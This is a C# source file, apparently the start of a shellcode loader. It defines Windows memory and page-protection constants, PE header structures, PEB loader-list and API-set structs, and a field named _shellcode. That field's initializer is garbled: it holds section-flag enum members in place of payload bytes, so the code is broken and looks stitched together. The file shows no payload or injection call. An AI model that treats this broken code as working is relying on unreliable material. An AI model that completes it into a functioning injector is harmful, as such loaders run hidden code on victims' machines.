using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System;
using System.IO;

public class Program
{
    public static uint MEM_COMMIT = 0x1000;
    public static uint MEM_RESERVE = 0x2000;
    public static uint MEM_RESET = 0x80000;
    public static uint MEM_RESET_UNDO = 0x1000000;
    public static uint MEM_LARGE_PAGES = 0x20000000;
    public static uint MEM_PHYSICAL = 0x400000;
    public static uint MEM_TOP_DOWN = 0x100000;
    public static uint MEM_WRITE_WATCH = 0x200000;
    public static uint MEM_COALESCE_PLACEHOLDERS = 0x1;
    public static uint MEM_PRESERVE_PLACEHOLDER = 0x2;
    public static uint MEM_DECOMMIT = 0x4000;
    public static uint MEM_RELEASE = 0x8000;

    public const UInt32 PAGE_NOACCESS = 0x01;
    public const UInt32 PAGE_READONLY = 0x02;
    public const UInt32 PAGE_READWRITE = 0x04;
    public const UInt32 PAGE_WRITECOPY = 0x08;
    public const UInt32 PAGE_EXECUTE = 0x10;
    public const UInt32 PAGE_EXECUTE_READ = 0x20;
    public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
    public const UInt32 PAGE_GUARD = 0x100;
    public const UInt32 PAGE_NOCACHE = 0x200;
    public const UInt32 PAGE_WRITECOMBINE = 0x400;
    public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
    public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;

    static readonly byte[] _shellcode = new byte[323] 
    {

        ALIGN_MASK = 0x00F00000,
        LNK_NRELOC_OVFL = 0x01000000,
        MEM_DISCARDABLE = 0x02000000,
        MEM_NOT_CACHED = 0x04000000,
        MEM_NOT_PAGED = 0x08000000,
        MEM_SHARED = 0x10000000,
        MEM_EXECUTE = 0x20000000,
        MEM_READ = 0x40000000,
        MEM_WRITE = 0x80000000
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct ApiSetNamespaceEntry
    {
        [FieldOffset(0x04)]
        public int NameOffset;

        [FieldOffset(0x08)]
        public int NameLength;

        [FieldOffset(0x10)]
        public int ValueOffset;

        [FieldOffset(0x14)]
        public int ValueLength;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct ApiSetValueEntry
    {
        [FieldOffset(0x00)]
        public int Flags;

        [FieldOffset(0x04)]
        public int NameOffset;

        [FieldOffset(0x08)]
        public int NameCount;

        [FieldOffset(0x0C)]
        public int ValueOffset;

        [FieldOffset(0x10)]
        public int ValueCount;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct ApiSetNamespace
    {
        [FieldOffset(0x0C)]
        public int Count;

        [FieldOffset(0x10)]
        public int EntryOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LDR_DATA_TABLE_ENTRY
    {
        public LIST_ENTRY InLoadOrderLinks;
        public LIST_ENTRY InMemoryOrderLinks;
        public LIST_ENTRY InInitializationOrderLinks;
        public IntPtr DllBase;
        public IntPtr EntryPoint;
        public uint SizeOfImage;
        public UNICODE_STRING FullDllName;
        public UNICODE_STRING BaseDllName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
    public enum PROCESSINFOCLASS : int
    {
        ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
